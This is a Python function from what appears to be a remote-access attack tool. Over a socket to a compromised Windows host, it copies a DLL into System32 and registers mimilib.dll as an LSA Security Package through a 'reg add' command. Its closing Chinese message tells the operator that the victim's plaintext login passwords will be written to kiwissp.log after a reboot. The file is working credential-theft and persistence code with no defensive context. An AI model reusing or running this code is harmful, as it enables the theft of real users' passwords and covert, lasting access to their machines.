import struct


def SSP(conn, choice):
    command1 = "copy " + choice.split()[1] + " c:\\windows\\system32"
    conn.sendall(command1.encode("gbk"))
    result_len = conn.recv(4)
    real_len = struct.unpack("i", result_len)[0]
    while True:
        if 1024 < real_len:
            result = conn.recv(1024).decode("gbk", errors="ignore")
            print(result)
            real_len = real_len - 1024
            continue
        else:
            result = conn.recv(1024).decode("gbk", errors="ignore")
            print(result)
            break
    command2 = "reg add HKLM\\System\\CurrentControlSet\\Control\\Lsa /v \"Security Packages\" /t REG_MULTI_SZ /d mimilib.dll /f"
    conn.sendall(command2.encode("gbk"))
    result_len = conn.recv(4)
    real_len = struct.unpack("i", result_len)[0]
    while True:
        if 1024 < real_len:
            result = conn.recv(1024).decode("gbk", errors="ignore")
            print(result)
            real_len = real_len - 1024
            continue
        else:
            result = conn.recv(1024).decode("gbk", errors="ignore")
            print(result)
            break
    print('\033[1;32;32m' + "[+] 操作完成,待受害者的计算机重启后,可前往c:\\windows\\system32\\kiwissp.log查看受害者的明文登录密码." + '\033[0m')
